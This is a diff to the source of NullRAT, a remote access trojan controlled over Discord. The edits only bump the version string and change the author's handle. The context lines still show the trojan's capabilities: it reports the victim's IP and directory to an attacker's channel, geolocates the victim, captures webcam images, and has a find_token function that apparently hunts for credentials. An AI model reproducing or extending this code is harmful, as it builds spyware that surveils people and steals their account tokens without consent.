@@ -16,7 +16,7 @@ nr_working = f"C:\\Users\\{os.getenv('username')}\\Appdata"
 @client.event
 async def on_ready():
     await client.get_channel(notification_channel).send(
-        embed=Embed(title = f"NullRAT v6.3 started on {IP()}\nCurrently present in {original_dir}")
+        embed=Embed(title = f"NullRAT v7.0 started on {IP()}\nCurrently present in {original_dir}")
     )
 
 # Intelligence Gathering #
@@ -53,7 +53,7 @@ async def geolocate(ctx):
     embed.add_field(name="Longitude", value=data["lon"], inline=True)
     embed.add_field(name="Zip code", value=data["zip"], inline=True)
     embed.add_field(name="ISP", value=data["isp"], inline=True)
-    embed.set_footer(text="Written by NullCode1337#5386")
+    embed.set_footer(text="Written by NullCode1337#1638")
     await ctx.response.send_message(embed=embed)
 
 @client.slash_command(description="Capture image from webcam", guild_ids=server_ids)  
@@ -287,7 +287,7 @@ def EmbedGen(title_main, name, value):
     color = 0x0081FA
     embed = Embed(title=title_main, color=color)
     embed.add_field(name=name, value=value)
-    embed.set_footer(text="Written by NullCode1337#5386")
+    embed.set_footer(text="Written by NullCode1337#1638")
     return embed
 
 def find_token():
